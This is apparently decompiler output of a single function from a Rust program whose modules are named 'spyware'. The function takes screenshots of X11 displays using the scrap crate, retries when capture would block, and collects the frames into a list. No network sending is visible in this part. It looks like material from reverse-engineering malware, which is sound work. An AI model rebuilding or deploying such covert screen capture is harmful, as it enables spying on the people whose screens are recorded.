undefined8 *
_ZN7spyware7actions18screenshot_actions22get_screenshot_request17h77f87121c90614c4E
          (undefined8 *param_1)

{
  code *pcVar1;
  undefined *puVar2;
  char cVar3;
  ulong uVar4;
  undefined2 uVar5;
  undefined8 local_180;
  undefined **local_178;
  undefined8 uStack_170;
  undefined8 **local_168;
  undefined local_160 [16];
  undefined8 local_130;
  undefined8 uStack_128;
  undefined8 local_120;
  long local_118;
  undefined8 local_110;
  char *local_108;
  undefined8 uStack_100;
  undefined8 local_f8;
  undefined **local_f0;
  undefined *puStack_e8;
  undefined8 local_e0;
  char *local_d8;
  undefined8 uStack_d0;
  char *local_c8;
  undefined8 local_c0;
  undefined8 local_b8;
  char *local_90;
  undefined8 uStack_88;
  undefined4 local_80;
  undefined4 uStack_7c;
  undefined local_78 [16];
  undefined local_68 [32];
  undefined local_48 [24];
  
  local_130 = 0;
  uStack_128 = 8;
  local_120 = 0;
  uVar4 = _ZN4core4sync6atomic11atomic_load17h8c88032dab18ab12E();
  if (3 < uVar4) {
    local_178 = &PTR_s_Getting_screenshot_001b9f08;
    uStack_170 = 1;
    local_168 = (undefined8 **)0x8;
    local_160 = (undefined  [16])0x0;
                    /* try { // try from 00158e56 to 00158f0c has its CatchHandler @ 00159149 */
    local_b8 = (*(code *)PTR__ZN3log13__private_api3loc17he75f2f86c1ff97b9E_001be620)
                         (&PTR_s_src_actions_screenshot_actions_r_001b9f38);
    local_d8 = "spyware::actions::screenshot_actions";
    uStack_d0 = 0x24;
    local_c8 = "spyware::actions::screenshot_actions";
    local_c0 = 0x24;
    _ZN3log13__private_api3log17h13afddf373bd7d7fE(&local_178,4,&local_d8);
  }
  (*(code *)PTR__ZN5scrap6common3x117Display3all17h028c2cd890d978afE_001be8b0)(&local_178);
  _ZN4core6result19Result_LT_T_C_E_GT_6expect17hefa40e5ef76aaa1fE(local_48,&local_178);
  _ZN90__LT_alloc__vec__Vec_LT_T_C_A_GT__u20_as_u20_core__iter__traits__collect__IntoIterator_GT_9into_iter17hb4b0dd109b77bc21E
            (local_68,local_48);
  _ZN103__LT_alloc__vec__into_iter__IntoIter_LT_T_C_A_GT__u20_as_u20_core__iter__traits__iterator__Iterator_GT_4next17h5ea6a75bdaeb1c6cE
            (&local_90,local_68);
  if ((char)uStack_7c == '\x02') {
    _ZN4core3ptr87drop_in_place_LT_alloc__vec__into_iter__IntoIter_LT_scrap__common__x11__Display_GT__GT_17h7f2fe04fdf4c91d5E
              (local_68);
    param_1[2] = local_120;
    *param_1 = local_130;
    param_1[1] = uStack_128;
    param_1[3] = 0x8000000000000000;
    return param_1;
  }
  local_f8 = CONCAT44(uStack_7c,local_80);
  local_108 = local_90;
  uStack_100 = uStack_88;
  local_178 = &PTR_s_Display_id_001b9f18;
  uStack_170 = 1;
  local_168 = (undefined8 **)0x8;
  local_160 = (undefined  [16])0x0;
                    /* try { // try from 00158f8b to 00158f95 has its CatchHandler @ 0015912a */
  (*(code *)PTR__ZN3std2io5stdio6_print17h17d6c2a1d6a6f99eE_001be648)(&local_178);
  local_c8 = (char *)local_f8;
  local_d8 = local_108;
  uStack_d0 = uStack_100;
                    /* try { // try from 00158fb8 to 00158fdc has its CatchHandler @ 00159125 */
  (*(code *)PTR__ZN5scrap6common3x118Capturer3new17he891e0d15b72a285E_001be8b8)
            (&local_178,&local_d8);
  _ZN4core6result19Result_LT_T_C_E_GT_6expect17h742920b880be4ab9E(&local_d8,&local_178);
  puVar2 = PTR__ZN5scrap6common3x118Capturer5frame17hab680e12d159cf27E_001be8c0;
  uVar5 = (undefined2)((ulong)local_b8 >> 0x30);
  local_78._0_8_ = (ulong)CONCAT24(uVar5,local_b8._4_4_) & 0xffff;
  local_78._8_2_ = uVar5;
  local_78._10_6_ = 0;
  while( true ) {
    while( true ) {
                    /* try { // try from 00159021 to 00159074 has its CatchHandler @ 00159104 */
      (*(code *)puVar2)(&local_118,&local_d8);
      if (local_118 == 0) break;
      _ZN52__LT_T_u20_as_u20_alloc__slice__hack__ConvertVec_GT_6to_vec17h4bd00d1297ead281E
                (&local_f0,local_118,local_110);
      local_168 = (undefined8 **)local_e0;
      local_178 = local_f0;
      uStack_170 = puStack_e8;
      local_160 = local_78;
      _ZN5alloc3vec16Vec_LT_T_C_A_GT_4push17he3b9a1547804d23cE(&local_130,&local_178);
    }
    local_180 = local_110;
    cVar3 = _ZN3std2io5error5Error4kind17h7f0d5435ec1cf07fE();
    if (cVar3 != '\r') break;
                    /* try { // try from 0015908a to 00159096 has its CatchHandler @ 00159102 */
    (*(code *)PTR__ZN3std6thread5sleep17h1a6eeffe1c923e1fE_001be730)(0,0xfe502a);
                    /* try { // try from 00159097 to 001590a0 has its CatchHandler @ 00159104 */
    _ZN4core3ptr42drop_in_place_LT_std__io__error__Error_GT_17h2ffe2f512d0f1687E(&local_180);
  }
  local_f0 = (undefined **)&local_180;
  puStack_e8 = 
  PTR__ZN60__LT_std__io__error__Error_u20_as_u20_core__fmt__Display_GT_3fmt17hcf0c0103019d8a0aE_001be638
  ;
  local_178 = &PTR_s_Error__001b9f28;
  uStack_170 = 1;
  local_160 = ZEXT816(1);
                    /* try { // try from 001590ee to 001590ff has its CatchHandler @ 00159109 */
  local_168 = &local_f0;
  (*(code *)PTR__ZN4core9panicking9panic_fmt17he33b64161001a34bE_001be760)
            (&local_178,&PTR_s_src_actions_screenshot_actions_r_001b9f98);
                    /* WARNING: Does not return */
  pcVar1 = (code *)invalidInstructionException();
  (*pcVar1)();
}